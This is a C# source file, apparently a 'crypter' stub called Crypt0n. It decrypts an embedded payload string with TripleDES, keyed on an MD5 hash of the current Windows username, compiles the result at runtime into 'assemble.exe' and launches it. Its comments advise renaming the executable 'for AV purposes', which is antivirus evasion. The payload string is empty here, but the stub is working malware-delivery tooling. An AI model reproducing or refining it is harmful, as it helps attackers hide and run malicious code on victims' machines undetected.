//http://www.dijksterhuis.org/encrypting-decrypting-string/

using System;
using System.Text;
using System.Security.Cryptography;
using Microsoft.CSharp;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Management;
using System.Threading;
using System.CodeDom.Compiler;
using System.Net;
using System.IO;


namespace Crypt0n
{
    class MainClass
    {
        public static void Main(string[] args)
        {
            string Code = "";
            string Password = Environment.UserName.ToString();
            string DecryptedCode = DecryptString(Code, Password);
            CSharpCodeProvider myCodeProvider = new CSharpCodeProvider();
            ICodeCompiler myCodeCompiler = myCodeProvider.CreateCompiler();
            String[] referenceAssemblies = { "System.dll" }; //if you plan to do more than really simple stuff with it, add stuff to this list (seperate them with commas)
            string myAssemblyName = "assemble.exe";
            CompilerParameters myCompilerParameters = new CompilerParameters(referenceAssemblies, myAssemblyName);
            myCompilerParameters.GenerateExecutable = true;
            myCompilerParameters.GenerateInMemory = true;
            CompilerResults compres = myCodeCompiler.CompileAssemblyFromSource(myCompilerParameters, DecryptedCode);
            Process.Start("assemble.exe"); //for AV purposes, it's recommended that you change the name of this, or even make the name self-creating
        }
        public static string DecryptString(string Message, string Passphrase)
        {
            byte[] Results;
            System.Text.UTF8Encoding UTF8 = new System.Text.UTF8Encoding();

            // Step 1. We hash the passphrase using MD5
            // We use the MD5 hash generator as the result is a 128 bit byte array
            // which is a valid length for the TripleDES encoder we use below

            MD5CryptoServiceProvider HashProvider = new MD5CryptoServiceProvider();
            byte[] TDESKey = HashProvider.ComputeHash(UTF8.GetBytes(Passphrase));

            // Step 2. Create a new TripleDESCryptoServiceProvider object
            TripleDESCryptoServiceProvider TDESAlgorithm = new TripleDESCryptoServiceProvider();

            // Step 3. Setup the decoder
            TDESAlgorithm.Key = TDESKey;
            TDESAlgorithm.Mode = CipherMode.ECB;
            TDESAlgorithm.Padding = PaddingMode.PKCS7;

            // Step 4. Convert the input string to a byte[]
            byte[] DataToDecrypt = Convert.FromBase64String(Message);

            // Step 5. Attempt to decrypt the string
            try
            {
                ICryptoTransform Decryptor = TDESAlgorithm.CreateDecryptor();
                Results = Decryptor.TransformFinalBlock(DataToDecrypt, 0, DataToDecrypt.Length);
            }
            finally
            {
                // Clear the TripleDes and Hashprovider services of any sensitive information
                TDESAlgorithm.Clear();
                HashProvider.Clear();
            }

            // Step 6. Return the decrypted string in UTF8 format
            return UTF8.GetString(Results);
        }
    }
}
